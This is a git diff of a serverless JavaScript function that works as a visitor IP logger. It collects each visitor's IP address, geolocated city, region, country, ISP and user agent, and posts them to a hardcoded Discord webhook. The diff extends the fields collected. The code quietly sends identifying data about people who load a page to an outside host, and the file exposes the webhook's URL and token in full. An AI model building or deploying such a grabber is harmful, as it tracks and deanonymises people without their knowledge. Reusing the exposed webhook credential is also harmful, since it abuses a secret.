@@ -1,12 +1,13 @@
-exports.handler = async (event, context) => {
+exports.handler = async (event) => {
   const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";
 
   const ip =
-    event.headers['x-nf-client-connection-ip'] ||
-    event.headers['client-ip'] ||
-    event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-    'Unknown IP';
+    event.headers["x-nf-client-connection-ip"] ||
+    event.headers["client-ip"] ||
+    event.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+    "Unknown IP";
 
+  const userAgent = event.headers["user-agent"] || "Unknown";
   const timestamp = new Date().toISOString();
 
   try {
@@ -16,30 +17,34 @@ exports.handler = async (event, context) => {
     const {
       country = "N/A",
       region = "N/A",
-      city = "N/A"
+      city = "N/A",
+      isp = "N/A"
     } = geoData;
 
     const message = {
-      content: `**IP:** ${ip}
-**Location:** ${city}, ${region}, ${country}
-**Time:** ${timestamp}`
+      content: `New Visitor Logged
+IP: ${ip}
+Location: ${city}, ${region}, ${country}
+ISP: ${isp}
+User Agent: ${userAgent}
+Time: ${timestamp}`
     };
 
     await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(message),
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message)
     });
 
     return {
       statusCode: 200,
-      body: 'IP & location sent!',
+      body: "Logged successfully"
     };
-  } catch (error) {
-    console.error('Webhook failed:', error);
+  } catch (err) {
+    console.error("Error:", err);
     return {
       statusCode: 500,
-      body: 'Error sending data',
+      body: "Failed to send data"
     };
   }
 };
